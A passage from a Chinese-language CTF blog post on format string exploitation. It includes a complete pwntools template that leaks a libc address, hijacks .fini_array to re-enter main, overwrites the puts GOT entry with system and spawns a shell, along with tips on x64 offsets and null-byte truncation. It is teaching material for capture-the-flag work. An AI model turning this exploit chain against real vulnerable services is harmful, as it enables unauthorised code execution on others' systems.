+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取 main 函数的地址</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"><span class="comment"># 获取 .fini_array 的地址 (通常等价于 __do_global_dtors_aux_fini_array_entry)</span></span><br><span class="line">fini_array_addr = elf.symbols[<span class="string">&#x27;__do_global_dtors_aux_fini_array_entry&#x27;</span>] <span class="comment"># 或者直接填 .fini_array 所在的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在同一次 payload 中，既写 .fini_array 让他循环，又利用 %p 或 %s 泄露 libc</span></span><br><span class="line">payload = fmtstr_payload(offset, &#123;fini_array_addr: main_addr&#125;)</span><br></pre></td></tr></table></figure>
+<h2 id="实战套路：栈残留盲打全流程"><a href="#实战套路：栈残留盲打全流程" class="headerlink" title="实战套路：栈残留盲打全流程"></a>实战套路：栈残留盲打全流程</h2><p>这是 AWDP/解题赛中，处理 64 位程序和 One-Shot（只能玩一次）题目的最高效杀招，直接跳过 <code>%s</code> 泄露的坑</p>
+<p><strong>什么时候必须去栈上找残留信息来“盲打“</strong></p>
+<ol>
+<li><p><strong>One-Shot 限制</strong>：程序只有一次 <code>printf</code> 机会就直接退出。你必须在同一次 Payload 中完成【泄露】<strong>和</strong>【续命/攻击】，此时无法通过 <code>%s</code> 发送目标地址（因为 <code>\x00</code> 截断会破坏后面的续命 Payload）。</p>
+</li>
+<li><p><strong>严格的长度/字符限制</strong>：你的 Payload 容不下手动塞入带有 <code>\x00</code> 的大地址去泄露。</p>
+</li>
+</ol>
+<h3 id="第一阶段：通过-GDB算偏移"><a href="#第一阶段：通过-GDB算偏移" class="headerlink" title="第一阶段：通过 GDB算偏移"></a>第一阶段：通过 GDB算偏移</h3><p><strong>目标</strong>：在栈底寻找 <code>__libc_start_main_ret</code> (或相关启动函数) 的地址，并算出 <code>%n$p</code> 偏移。</p>
+<ol>
+<li><p>在 Pwntools 里加上 <code>gdb.attach(io)</code> 启动程序。</p>
+</li>
+<li><p>程序停在 <code>printf</code> 前，在 gdb 终端输入 <strong><code>stack 50</code></strong>。</p>
+</li>
+<li><p>往下翻，盯住 <code>0x7f...</code> 开头的地址，寻找带有 <code>__libc_start_main</code> 或 <code>__libc_start_call_main</code> 标识的行。</p>
+<ul>
+<li>示例：<code>27:0138│+008 0x7fffffffd6f8 —▸ 0x7ffff7c29d90 (__libc_start_call_main+128)</code></li>
+</ul>
+</li>
+<li><p><strong>计算偏移公式</strong>：拿最左边的十六进制序号转成十进制，加上寄存器偏移(例如这里偏移是6)</p>
+<ul>
+<li>示例：<code>0x27</code> = <code>39</code>，<code>39 + 6 = 45</code>。所以目标偏移是 <code>%45$p</code>。</li>
+</ul>
+</li>
+</ol>
+<h3 id="第二阶段：算出基址后干什么"><a href="#第二阶段：算出基址后干什么" class="headerlink" title="第二阶段：算出基址后干什么"></a>第二阶段：算出基址后干什么</h3><ol>
+<li><p>拿到 <code>%45$p</code> 吐出来的残留地址（如 <code>0x7ffff7c29d90</code>）后，减去它在本地 libc 里的静态偏移，得到 <strong><code>libc_base</code> (Libc基址)</strong>。</p>
+</li>
+<li><p>有了基址，直接算出 <strong><code>system_addr = libc_base + libc.sym[&#39;system&#39;]</code></strong>。</p>
+</li>
+<li><p>发动<strong>第二回合</strong>：利用 <code>fmtstr_payload</code>，将 <code>puts</code> 或 <code>printf</code> 的 GOT 表，直接覆盖为 <code>system_addr</code>。</p>
+</li>
+</ol>
+<h3 id="一波流打法模板"><a href="#一波流打法模板" class="headerlink" title="一波流打法模板"></a>一波流打法模板</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== 环境配置 ====================</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./fmtstr_level2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)  <span class="comment"># 实战中换成题目提供的 libc</span></span><br><span class="line">io = process(<span class="string">&#x27;./fmtstr_level2&#x27;</span>)</span><br><span class="line">base_offset = <span class="number">6</span> <span class="comment"># 测出的格式化字符串起点的物理偏移</span></span><br><span class="line">fini_array = <span class="number">0x4031F0</span> <span class="comment"># 也可以用 elf.sym[&#x27;__do_global_dtors_aux_fini_array_entry&#x27;]</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"><span class="comment"># ==================== 回合一：泄露 + 强行续命 ====================</span></span><br><span class="line"><span class="comment"># 1. 假设我们在 gdb 中算出 libc 残留地址在第 46 个参数坑位</span></span><br><span class="line"><span class="comment"># 2. 我们用 %46$paaa 来凑齐 8 个字节 (占 1 个坑位)</span></span><br><span class="line"><span class="comment"># 3. 因为多占了 1 个坑位，后边 fmtstr_payload 的物理起点从 6 顺延变成 7</span></span><br><span class="line"><span class="comment"># 4. %p 输出 &quot;0x7f...&quot; 约 14 个字符，加上 &quot;aaa&quot; 是 17 个字符 (0x11)，所以 numbwritten=0x11</span></span><br><span class="line">payload1 = <span class="string">b&quot;%45$paaa&quot;</span> + fmtstr_payload(<span class="number">7</span>, &#123;fini_array: main_addr&#125;, numbwritten=<span class="number">0x11</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;ID\n&quot;</span>, payload1) <span class="comment"># 根据题目的提示符修改 &quot;ID\n&quot;</span></span><br><span class="line"><span class="comment"># ==================== 基址计算 ====================</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line"><span class="comment"># 接收紧随 &quot;0x&quot; 之后的 12 个十六进制字符，并转成整数</span></span><br><span class="line">leaked_libc_addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 泄露的残留地址:&quot;</span>, <span class="built_in">hex</span>(leaked_libc_addr))</span><br><span class="line"><span class="comment"># 减去该函数在 libc 里的相对偏移 (如果报错可用 gdb 看具体的偏移常数)</span></span><br><span class="line">libc_base = leaked_libc_addr - (libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>] + <span class="number">128</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 计算出的 libc_base:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># 顺藤摸瓜找到 system</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># ==================== 回合二：大杀器劫持 GOT ====================</span></span><br><span class="line"><span class="comment"># 程序因为 fini_array 被改，重新回到了 main 函数，此时我们有了一次新机会</span></span><br><span class="line"><span class="comment"># 这次我们直接改 puts 或者 printf 的 GOT 表为 system 的地址</span></span><br><span class="line">payload2 = fmtstr_payload(<span class="number">6</span>, &#123;elf.got[<span class="string">&#x27;puts&#x27;</span>]: system_addr&#125;)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;ID\n&quot;</span>, payload2)</span><br><span class="line"><span class="comment"># ==================== 终结比赛 ====================</span></span><br><span class="line"><span class="comment"># 程序接下来如果执行 puts(&quot;/bin/sh&quot;) 或者你的输入，就会执行 system</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="实战避坑指南"><a href="#实战避坑指南" class="headerlink" title="实战避坑指南"></a>实战避坑指南</h1><h2 id="架构差异传参坑-x86-vs-x64"><a href="#架构差异传参坑-x86-vs-x64" class="headerlink" title="架构差异传参坑 (x86 vs x64)"></a>架构差异传参坑 (x86 vs x64)</h2><ul>
+<li><p><strong>x86 (32位)</strong>：参数全部通过栈传递。用 <code>fmtarg</code> 工具或 <code>%x</code> 可以很直观地看到 payload 直接落在栈上。</p>
+</li>
+<li><p><strong>x64 (64位) ：注意</strong>：前 6 个参数是通过寄存器传递的（<code>rdi</code> 放了格式化字符串本身，接下来 5 个参数是 <code>RSI, RDX, RCX, R8, R9</code>）。这意味着，<strong>你的 payload 在 x64 下，偏移量至少是 6 起步</strong>（因为前 5 个坑位被寄存器占了）。</p>
+</li>
+</ul>
+<h2 id="x00-截断坑-0字节陷阱"><a href="#x00-截断坑-0字节陷阱" class="headerlink" title="\x00 截断坑 (0字节陷阱)"></a><code>\x00</code> 截断坑 (0字节陷阱)</h2><p>这是初学者最容易死的地方：<code>printf</code> 处理字符串时，只要遇到 <code>\x00</code> 就会认为字符串结束，直接停止解析</p>
+<ul>
+<li><p><strong>64 位下</strong>：<code>payload = p64(0x401234) + b&quot;%6$s&quot;</code>。因为 <code>0x401234</code> 存为 64 位时是 <code>\x34\x12\x40\x00\x00\x00\x00\x00</code>，<code>printf</code> 读到第四个字节 <code>\x00</code> 就停了，后面的 <code>%6$s</code> 根本不会执行</p>
+</li>
+<li><p><strong>正确写法</strong>：必须把包含大量 <code>\x00</code> 的内存地址放在 payload 的<strong>最后面</strong>，把格式化符号放前面</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%7$saaaa&quot;</span> + p64(<span class="number">0x401234</span>) <span class="comment"># 用 aaaa 对齐 8 字节，地址放最后</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+
+
+
+    
+    
+    
+        <div class="reward-container">
+  <div>您的支持将鼓励我继续创作!</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/reward.jpg" alt="s0m1ng 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>s0m1ng
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2026/03/19/PWN/pwn_attack/format_string/fmt_string%E6%80%BB%E7%BB%93/" title="格式化字符串漏洞 (Format String)">http://example.com/2026/03/19/PWN/pwn_attack/format_string/fmt_string总结/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+              <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="tag"><i class="fa fa-tag"></i> 格式化字符串</a>
+              <a href="/tags/fmtstr/" rel="tag"><i class="fa fa-tag"></i> fmtstr</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/03/16/PWN/pwn_attack/AWD/AWD%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC/" rel="prev" title="AWD攻击：批量自动化攻击框架">
+      <i class="fa fa-chevron-left"></i> AWD攻击：批量自动化攻击框架
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9D%A2%E6%80%BB%E7%BB%93"><span class="nav-number">1.</span> <span class="nav-text">格式化字符串漏洞全面总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%88%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%89%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">基础知识（格式化字符串）：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A0%B8%E5%BF%83%E7%BB%84%E5%90%88"><span class="nav-number">1.2.</span> <span class="nav-text">Pwn 漏洞利用核心组合</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E3%80%90%E6%B3%84%E9%9C%B2%E9%80%9F%E6%9F%A5%E8%A1%A8%E3%80%91%E5%88%B0%E5%BA%95%E5%93%AA%E4%BA%9B%E6%A0%BC%E5%BC%8F%E7%AC%A6%E4%BC%9A%E2%80%9C%E8%A7%A3%E5%BC%95%E7%94%A8%E2%80%9D%EF%BC%9F"><span class="nav-number">1.3.</span> <span class="nav-text">【泄露速查表】到底哪些格式符会“解引用”？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">格式化字符串漏洞：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E9%80%94%E4%B8%80%EF%BC%9A%E6%B3%84%E9%9C%B2%E6%A0%88%E4%B8%8A%E6%95%B0%E6%8D%AE-%E5%AF%BB%E6%89%BE%E5%8F%82%E6%95%B0%E5%81%8F%E7%A7%BB"><span class="nav-number">2.1.</span> <span class="nav-text">用途一：泄露栈上数据 &#x2F; 寻找参数偏移</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E9%80%94%E4%BA%8C%EF%BC%9A%E8%AF%BB%E5%8F%96%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%85%E5%AD%98"><span class="nav-number">2.2.</span> <span class="nav-text">用途二：读取任意地址内存</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E9%80%94%E4%B8%89%EF%BC%9A%E6%94%B9%E5%86%99%E6%A0%88%E4%B8%8A%E5%8F%98%E9%87%8F-%E5%86%99%E5%B0%8F%E6%95%B0%E6%8D%AE"><span class="nav-number">2.3.</span> <span class="nav-text">用途三：改写栈上变量 &#x2F; 写小数据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E9%80%94%E5%9B%9B%EF%BC%9A%E8%A6%86%E5%86%99%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80-%E5%8A%AB%E6%8C%81-GOT-%E8%A1%A8%E8%8E%B7%E5%8F%96-Shell"><span class="nav-number">2.4.</span> <span class="nav-text">用途四：覆写任意地址 &#x2F; 劫持 GOT 表获取 Shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E9%80%94%E4%BA%94%EF%BC%88%E8%BF%9B%E9%98%B6%EF%BC%89%EF%BC%9A%E5%8A%AB%E6%8C%81-fini-array-%E5%AE%9E%E7%8E%B0%E6%97%A0%E9%99%90%E5%BE%AA%E7%8E%AF-%E7%A0%B4%E9%99%A4-One-Shot-%E9%99%90%E5%88%B6"><span class="nav-number">2.5.</span> <span class="nav-text">用途五（进阶）：劫持 .fini_array 实现无限循环 (破除 One-Shot 限制)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E5%A5%97%E8%B7%AF%EF%BC%9A%E6%A0%88%E6%AE%8B%E7%95%99%E7%9B%B2%E6%89%93%E5%85%A8%E6%B5%81%E7%A8%8B"><span class="nav-number">2.6.</span> <span class="nav-text">实战套路：栈残留盲打全流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5%EF%BC%9A%E9%80%9A%E8%BF%87-GDB%E7%AE%97%E5%81%8F%E7%A7%BB"><span class="nav-number">2.6.1.</span> <span class="nav-text">第一阶段：通过 GDB算偏移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%EF%BC%9A%E7%AE%97%E5%87%BA%E5%9F%BA%E5%9D%80%E5%90%8E%E5%B9%B2%E4%BB%80%E4%B9%88"><span class="nav-number">2.6.2.</span> <span class="nav-text">第二阶段：算出基址后干什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E6%B3%A2%E6%B5%81%E6%89%93%E6%B3%95%E6%A8%A1%E6%9D%BF"><span class="nav-number">2.6.3.</span> <span class="nav-text">一波流打法模板</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97"><span class="nav-number">3.</span> <span class="nav-text">实战避坑指南</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%B6%E6%9E%84%E5%B7%AE%E5%BC%82%E4%BC%A0%E5%8F%82%E5%9D%91-x86-vs-x64"><span class="nav-number">3.1.</span> <span class="nav-text">架构差异传参坑 (x86 vs x64)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x00-%E6%88%AA%E6%96%AD%E5%9D%91-0%E5%AD%97%E8%8A%82%E9%99%B7%E9%98%B1"><span class="nav-number">3.2.</span> <span class="nav-text">\x00 截断坑 (0字节陷阱)</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="s0m1ng"
+      src="/images/profile_photo.jpg">
+  <p class="site-author-name" itemprop="name">s0m1ng</p>
+  <div class="site-description" itemprop="description">学习逆向贵在坚持</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">34</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">36</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=1327470638&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;1327470638&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fab fa-qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">s0m1ng</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+function initCategoryFold() {
+  // 找到所有包含了子分类的 <ul>
+  var childLists = document.querySelectorAll('.category-list-child');
+  
+  childLists.forEach(function(child) {
+    // 防抖：防止 PJAX 刷新导致重复注入图标
+    if (child.parentElement.getAttribute('data-folded') === 'true') return;
+    child.parentElement.setAttribute('data-folded', 'true');
+    
+    // 1. 默认把所有子分类强行隐藏
+    child.style.display = 'none'; 
+    
+    // 2. 创建一个带有黑客风的 [+]/[-] 开关
+    var toggleSpan = document.createElement('span');
+    toggleSpan.innerHTML = ' ➕ ';
+    toggleSpan.style.cursor = 'pointer';
+    toggleSpan.style.fontSize = '12px';
+    toggleSpan.style.marginRight = '5px';
+    
+    // 3. 把开关插到父分类名字的前面
+    var parentLi = child.parentElement;
+    parentLi.insertBefore(toggleSpan, parentLi.firstChild);
+    
+    // 4. 给开关绑定点击事件 (Hook)
+    toggleSpan.addEventListener('click', function(e) {
+      e.stopPropagation(); // 阻止事件冒泡，防止误点分类链接
+      if (child.style.display === 'none') {
+        child.style.display = 'block';
+        toggleSpan.innerHTML = ' ➖ ';
+      } else {
+        child.style.display = 'none';
+        toggleSpan.innerHTML = ' ➕ ';
+      }
+    });
+  });
+}
+
+// 首次加载页面时执行
+document.addEventListener("DOMContentLoaded", initCategoryFold);
+// 如果你的 NexT 开启了 PJAX (无刷新跳转)，保证跳转后依然生效
+document.addEventListener("pjax:success", initCategoryFold);
+</script>
+</body>
+</html>
